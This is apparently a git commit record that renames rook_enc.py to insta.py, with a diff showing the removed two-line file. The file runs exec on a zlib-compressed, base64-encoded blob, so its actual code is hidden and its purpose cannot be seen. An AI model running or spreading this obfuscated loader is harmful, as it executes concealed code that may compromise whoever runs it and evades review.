e2b90520e8222951126489a1e2179af86e74d50a
Anonymos <76127094+rebin23@users.noreply.github.com>
2021-06-09 15:17:48 +0300

    Rename rook_enc.py to insta.py

--- rook_enc.py
+++
@@ -1,2 +0,0 @@
-import marshal,zlib,base64
-exec(zlib.decompress(base64.b64decode("eJxdj80OgjAQhO8kvAO3lkRbxJuJz2IqWaCR7tbuEuTtLfEnxttmZufLjA+RklQJ7jOwcFn4l0D5LAtiwysLBK1SqPapr0zbmriquiySW6rzN2gGEK1Gkcgna7NnBi/jfJ0ZUkcogGI6CtYh4RpmPjSNFaKJbXAerUcWdwHsvvDbBs8YgYdsVXo/QZYoAmr1brFTy/a8WWZJXkDn3EfoJmLQ9d+MuMpIePzZ8QTAJVNe")))
